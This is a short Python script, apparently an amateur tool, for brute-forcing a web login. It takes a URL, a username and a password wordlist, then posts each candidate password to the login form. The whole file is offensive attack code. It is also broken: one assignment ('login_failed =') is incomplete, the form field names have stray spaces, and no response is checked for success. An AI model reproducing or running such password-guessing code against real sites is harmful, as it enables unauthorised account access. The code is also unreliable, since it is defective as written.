import requests

url = input("[+] input Url: ")
username = input('[+] Enter Username: ')
password_file = input('[+] Enter password file: ')
login_failed =

def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print(f'{password}')
        data = {
                ' username' : username, 
                ' password' : password,
                ' Login ' : ' submit '
                }
        requests.post(url, data=data)


with open(password_file, 'r') as passwords:
    cracking(username, url) 